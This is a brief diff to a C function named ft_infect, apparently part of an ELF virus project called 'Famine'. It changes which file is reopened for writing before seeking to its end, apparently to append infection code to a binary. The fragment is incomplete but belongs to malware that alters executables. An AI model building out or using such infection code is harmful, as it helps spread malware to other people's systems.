@@ -24,7 +24,7 @@ void    ft_infect(t_famine *famine)
 {
     munmap(famine->elf, famine->file_size);
     close(famine->fd);
-    famine->fd = open(famine->file, O_WRONLY);
+    famine->fd = open(famine->binary, O_WRONLY);
     if (famine->fd == -1)
         return;
     lseek(famine->fd, 0, SEEK_END);
